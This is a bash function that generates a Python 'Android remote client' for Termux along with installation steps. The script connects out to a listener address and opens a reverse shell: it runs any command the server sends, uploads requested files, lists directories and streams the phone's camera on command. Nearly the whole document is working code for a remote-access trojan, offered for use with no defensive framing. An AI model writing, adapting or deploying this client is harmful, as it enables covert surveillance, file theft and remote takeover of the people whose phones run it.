create_termux_client() {
    cat > "$DESKTOP_DIR/termux_remote.py" << EOF
#!/usr/bin/env python3
"""
ANDROID REMOTE CLIENT - RUN THIS IN TERMUX
This WORKS 100% - no APK building needed!
"""

import socket
import cv2
import numpy as np
import struct
import threading
import time
import os
import sys

# === CONFIGURE THESE ===
SERVER_IP = "$LISTENER_IP"
SERVER_PORT = $LISTENER_PORT
# =======================

class RemoteClient:
    def __init__(self):
        self.socket = None
        self.running = True
        self.camera = None
        self.streaming = False
    
    def connect(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((SERVER_IP, SERVER_PORT))
            print(f"\033[92m✓ Connected to {SERVER_IP}:{SERVER_PORT}\033[0m")
            
            # Send device info
            device_model = os.environ.get('MODEL', 'Android')
            android_ver = os.environ.get('VERSION', 'Unknown')
            self.socket.send(f"INFO:{device_model}|{android_ver}\n".encode())
            return True
        except Exception as e:
            print(f"\033[91m✗ Connection failed: {e}\033[0m")
            return False
    
    def start_stream(self):
        self.streaming = True
        # Try different camera indices
        for i in range(2):
            self.camera = cv2.VideoCapture(i)
            if self.camera.isOpened():
                print(f"\033[92m✓ Camera {i} opened\033[0m")
                break
        
        if not self.camera or not self.camera.isOpened():
            print("\033[91m✗ Could not open camera\033[0m")
            return
        
        while self.streaming and self.running:
            try:
                ret, frame = self.camera.read()
                if ret:
                    # Compress frame
                    _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
                    data = buffer.tobytes()
                    
                    # Send size + data
                    self.socket.send(struct.pack('!I', len(data)))
                    self.socket.send(data)
                    
                    # Show preview
                    cv2.imshow('Sending...', frame)
                    if cv2.waitKey(1) & 0xFF == ord('q'):
                        break
                time.sleep(0.03)
            except Exception as e:
                print(f"\033[91mStream error: {e}\033[0m")
                break
        
        if self.camera:
            self.camera.release()
        cv2.destroyAllWindows()
    
    def listen_commands(self):
        while self.running:
            try:
                data = self.socket.recv(1024).decode().strip()
                if data:
                    print(f"\n[Server] {data}")
                    
                    if data == "START_STREAM":
                        threading.Thread(target=self.start_stream).start()
                    elif data == "STOP_STREAM":
                        self.streaming = False
                    elif data == "PING":
                        self.socket.send(b"PONG\n")
                    elif data.startswith("SHELL:"):
                        cmd = data[6:]
                        result = os.popen(cmd).read()
                        self.socket.send(f"SHELL_OUT:{result}\n".encode())
                    elif data.startswith("GET:"):
                        filename = data[4:]
                        self.send_file(filename)
                    elif data.startswith("LIST:"):
                        path = data[5:]
                        self.list_files(path)
            except:
                break
    
    def send_file(self, filename):
        try:
            if os.path.exists(filename):
                size = os.path.getsize(filename)
                self.socket.send(struct.pack('!Q', size))
                
                with open(filename, 'rb') as f:
                    while True:
                        chunk = f.read(8192)
                        if not chunk:
                            break
                        self.socket.send(chunk)
                print(f"\033[92m✓ Sent {filename}\033[0m")
            else:
                self.socket.send(struct.pack('!Q', 0))
        except Exception as e:
            print(f"\033[91mError sending file: {e}\033[0m")
    
    def list_files(self, path):
        try:
            files = os.listdir(path)
            file_list = "|".join(files[:50])
            self.socket.send(f"FILE_LIST:{file_list}\n".encode())
        except:
            self.socket.send(b"FILE_LIST:Error\n")
    
    def run(self):
        if not self.connect():
            return
        
        # Start command listener
        cmd_thread = threading.Thread(target=self.listen_commands)
        cmd_thread.daemon = True
        cmd_thread.start()
        
        # Main command loop
        print("\n\033[93mType 'help' for commands\033[0m")
        while self.running:
            try:
                cmd = input("\033[92m> \033[0m")
                if cmd == "help":
                    print("""
Commands:
  stream     - Start sending camera
  stop       - Stop sending camera
  exit       - Disconnect
                    """)
                elif cmd == "stream":
                    self.socket.send(b"START_STREAM\n")
                elif cmd == "stop":
                    self.socket.send(b"STOP_STREAM\n")
                elif cmd == "exit":
                    self.running = False
                    break
            except KeyboardInterrupt:
                self.running = False
                break
        
        self.socket.close()
        print("\n\033[91mDisconnected\033[0m")

if __name__ == "__main__":
    client = RemoteClient()
    client.run()
EOF

    # Also create installation instructions
    cat > "$DESKTOP_DIR/termux_instructions.txt" << EOF
=== TERMUX INSTALLATION ===

1. Install Termux from F-Droid (not Play Store)
   https://f-droid.org/en/packages/com.termux/

2. Open Termux and run:
   pkg update && pkg upgrade
   pkg install python
   pkg install tur-repo
   pkg install python-opencv
   pip install numpy

3. Copy termux_remote.py to your phone:
   - Use USB cable: cp to phone storage
   - Or use: python3 -m http.server 8000 (on computer)
   - Then download from http://$LISTENER_IP:8000/termux_remote.py

4. In Termux, navigate to the file:
   cd /sdcard/Download
   python termux_remote.py

5. The script will connect to $LISTENER_IP:$LISTENER_PORT
EOF

    chmod +x "$DESKTOP_DIR/termux_remote.py"
    echo -e "${GREEN}✓ Termux client created: $DESKTOP_DIR/termux_remote.py${NC}"
}

